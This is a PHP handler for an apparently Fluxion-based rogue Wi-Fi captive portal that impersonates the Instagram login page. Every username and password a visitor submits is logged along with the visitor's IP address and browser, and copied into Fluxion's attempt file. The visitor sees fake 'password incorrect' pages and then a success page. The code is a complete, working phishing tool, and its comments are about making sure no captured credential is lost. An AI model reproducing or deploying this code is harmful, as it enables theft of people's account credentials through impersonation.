<?php
/*
 * Instagram portal credential capture.
 *
 * The stock Fluxion authenticator (lib/authenticator.php) exists to verify a
 * candidate against the target's WPA handshake. That check is meaningless for
 * a web login page, so this portal posts to its own endpoint instead: every
 * attempt is appended to instagram_credentials.log next to the portal root
 * (i.e. <FLUXIONWorkspacePath>/instagram_credentials.log) and the visitor is
 * sent back to the login form with the usual "password incorrect" notice.
 * After MAX_ATTEMPTS attempts from the same address the success page is shown
 * so the flow terminates instead of looping forever.
 *
 * Log format, one attempt per line, tab separated:
 *   ISO-8601 time <TAB> client IP <TAB> username <TAB> password <TAB> user agent
 *
 * The log rotates in place once it reaches LOG_MAX_BYTES: the previous content
 * becomes <name>.1, the one before that <name>.2, up to LOG_KEEP files, so a
 * long-running portal cannot fill the workspace or the tmpfs it usually lives
 * on. Rotation and appends share one lock file, so concurrent submissions
 * cannot interleave a rename with a write.
 *
 * State that survives a reload lives in instagram_attempts.json: per client
 * address the attempt count, the last submission time and a fingerprint of the
 * last pair. That makes a double-clicked submit button or a page refresh one
 * attempt instead of two, which would otherwise show the success page to a
 * visitor who only tried once. Entries older than ATTEMPT_WINDOW are pruned on
 * every write, so the file cannot grow without bound.
 */

declare(strict_types=1);

// A stray notice in the response body would break the redirect and leak
// interpreter details to the visitor; keep them out of the output entirely.
ini_set('display_errors', '0');

const MAX_ATTEMPTS     = 2;
const MAX_FIELD_BYTES  = 256;
const MAX_BODY_BYTES   = 8192;
const LOG_MAX_BYTES    = 524288;
const LOG_KEEP         = 3;
const ATTEMPT_WINDOW   = 3600;
const ATTEMPT_MAX_IPS  = 1024;
const DUPLICATE_WINDOW = 60;

$workspace = dirname(__DIR__);
$logPath   = $workspace . '/instagram_credentials.log';
$statePath = $workspace . '/instagram_attempts.json';
$hitsPath  = $workspace . '/hit.txt';
$ipPath    = $workspace . '/ip_hits';

/**
 * Reduce visitor input to something that cannot break the log format.
 *
 * Tabs and newlines would split a submission across lines or columns, and
 * other control characters end up mangling the terminal the log is tailed in.
 * Truncation is byte based on purpose: php-cgi is not guaranteed to ship
 * mbstring, and cutting mid-codepoint is harmless for a log line.
 */
function clean_field(string $value, int $limit = MAX_FIELD_BYTES): string
{
    $value = preg_replace('/[\x00-\x1F\x7F]+/', ' ', $value);
    $value = trim($value === null ? '' : $value);
    return substr($value, 0, $limit);
}

/**
 * The address the visitor actually connected from.
 *
 * Only REMOTE_ADDR is consulted: on the portal everything arrives through the
 * local lighttpd, and honouring X-Forwarded-For would let a visitor reset their
 * own attempt counter at will.
 */
function client_ip(): string
{
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    if (!is_string($ip) || filter_var($ip, FILTER_VALIDATE_IP) === false) {
        return 'unknown';
    }
    return $ip;
}

function append_plain(string $path, string $data, int $mode = 0640): bool
{
    $handle = @fopen($path, 'ab');
    if ($handle === false) {
        return false;
    }
    $written = false;
    if (flock($handle, LOCK_EX)) {
        $written = fwrite($handle, $data) !== false;
        fflush($handle);
        flock($handle, LOCK_UN);
    }
    fclose($handle);
    @chmod($path, $mode);
    return $written;
}

/**
 * Append one line, rotating the file first if it has grown past the limit.
 *
 * The lock lives beside the log rather than on it, because rotation renames
 * the log while writers are queued. Everyone takes the same lock, so a rename
 * can never happen between another writer's open and write.
 */
function append_rotated(string $path, string $line, int $maxBytes, int $keep): bool
{
    $lock = @fopen($path . '.lock', 'c');
    if ($lock === false) {
        return false;
    }

    $written = false;
    if (flock($lock, LOCK_EX)) {
        clearstatcache(true, $path);
        $size = @filesize($path);
        if (is_int($size) && $size >= $maxBytes) {
            for ($index = $keep; $index >= 2; $index--) {
                $from = $path . '.' . ($index - 1);
                $to   = $path . '.' . $index;
                if (is_file($from)) {
                    @rename($from, $to);
                }
            }
            @rename($path, $path . '.1');
            @chmod($path . '.1', 0640);
        }

        $handle = @fopen($path, 'ab');
        if ($handle !== false) {
            $written = fwrite($handle, $line) !== false;
            fflush($handle);
            fclose($handle);
            @chmod($path, 0640);
        }
        @chmod($path . '.lock', 0640);
        flock($lock, LOCK_UN);
    }
    fclose($lock);

    return $written;
}

function bump_counter(string $path): void
{
    $handle = @fopen($path, 'c+');
    if ($handle === false) {
        return;
    }
    if (flock($handle, LOCK_EX)) {
        $raw   = (string) stream_get_contents($handle);
        $value = (int) preg_replace('/[^0-9]/', '', $raw);
        ftruncate($handle, 0);
        rewind($handle);
        fwrite($handle, (string) ($value + 1));
        fflush($handle);
        flock($handle, LOCK_UN);
    }
    fclose($handle);
    @chmod($path, 0640);
}

/**
 * Record an attempt and report the count after it, plus whether this exact
 * submission was already recorded moments ago.
 *
 * A corrupt or unreadable state file is treated as empty rather than as a
 * reason to fail: the worst case is one extra retry page, never a lost
 * credential.
 *
 * @return array{0:int,1:bool} [attempt count, duplicate]
 */
function register_attempt(string $path, string $ip, string $fingerprint): array
{
    $handle = @fopen($path, 'c+');
    if ($handle === false) {
        // Cannot persist state: keep the visitor on the retry page rather than
        // ending the exchange on a fabricated success.
        return [1, false];
    }

    $count     = 1;
    $duplicate = false;

    if (flock($handle, LOCK_EX)) {
        $now = time();
        $map = [];
        $raw = stream_get_contents($handle);
        if (is_string($raw) && $raw !== '') {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                $map = $decoded;
            }
        }

        foreach ($map as $key => $entry) {
            if (!is_string($key)) {
                unset($map[$key]);
                continue;
            }
            $seen = is_array($entry) ? (int) ($entry['t'] ?? 0) : 0;
            if ($seen > 0 && $seen < $now - ATTEMPT_WINDOW) {
                unset($map[$key]);
            }
        }

        if (count($map) > ATTEMPT_MAX_IPS) {
            uasort($map, static function ($left, $right): int {
                $leftStamp  = is_array($left) ? (int) ($left['t'] ?? 0) : 0;
                $rightStamp = is_array($right) ? (int) ($right['t'] ?? 0) : 0;
                return $rightStamp <=> $leftStamp;
            });
            $map = array_slice($map, 0, ATTEMPT_MAX_IPS, true);
        }

        $entry = $map[$ip] ?? null;
        if (is_array($entry)) {
            $count  = (int) ($entry['c'] ?? 0);
            $last   = (int) ($entry['d'] ?? 0);
            $before = (string) ($entry['u'] ?? '');
        } else {
            // Entries written by the previous version were plain counters.
            $count  = is_int($entry) ? $entry : (int) $entry;
            $last   = 0;
            $before = '';
        }

        $duplicate = $before !== ''
            && $before === $fingerprint
            && $last > 0
            && ($now - $last) <= DUPLICATE_WINDOW
            && $count > 0;

        if (!$duplicate) {
            $count++;
        }

        $map[$ip] = [
            'c' => $count,
            't' => $now,
            'u' => $fingerprint,
            'd' => $duplicate ? $last : $now,
        ];

        $encoded = json_encode($map, JSON_PRETTY_PRINT);
        ftruncate($handle, 0);
        rewind($handle);
        fwrite($handle, $encoded === false ? '{}' : $encoded);
        fflush($handle);
        flock($handle, LOCK_UN);
    }

    fclose($handle);
    @chmod($path, 0640);

    return [$count, $duplicate];
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    header('Cache-Control: no-store');
    header('Location: index.html', true, 302);
    exit;
}

$declaredLength = (int) ($_SERVER['CONTENT_LENGTH'] ?? 0);
if ($declaredLength > MAX_BODY_BYTES) {
    http_response_code(413);
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    echo "Request entity too large\n";
    exit;
}

$ip       = client_ip();
$agent    = clean_field(is_string($_SERVER['HTTP_USER_AGENT'] ?? null) ? $_SERVER['HTTP_USER_AGENT'] : '-');
$username = clean_field(is_string($_POST['username'] ?? null) ? $_POST['username'] : '');
$password = clean_field(is_string($_POST['password'] ?? null) ? $_POST['password'] : '');

if ($username === '' && $password === '') {
    // Nothing was typed: this is not an attempt, so it must not be logged or
    // counted against the visitor.
    header('Cache-Control: no-store');
    header('Location: index.html', true, 302);
    exit;
}

[$attempts, $duplicate] = register_attempt(
    $statePath,
    $ip,
    sha1($username . "\0" . $password)
);

if (!$duplicate) {
    $line = implode("\t", [
        date('c'),
        $ip,
        $username,
        $password,
        $agent,
    ]) . "\n";

    if (!append_rotated($logPath, $line, LOG_MAX_BYTES, LOG_KEEP)) {
        // Last resort so an attempt is never silently dropped: a private file
        // in the system temp directory, outside the served document root.
        append_plain(sys_get_temp_dir() . '/instagram_credentials.log', $line, 0600);
    }

    // Mirror the pair into Fluxion's own attempt file, which the Captive Portal
    // arbiter copies into its pass log and then truncates.
    if ($username !== '' && $password !== '') {
        append_plain($workspace . '/pwdattempt.txt', $username . ':' . $password . "\n");
    }

    bump_counter($hitsPath);
    append_plain($ipPath, $ip . "\n");
}

$target = $attempts >= MAX_ATTEMPTS
    ? 'final.html'
    : 'error.html?u=' . rawurlencode($username);

header('Cache-Control: no-store');
header('Location: ' . $target, true, 302);
exit;
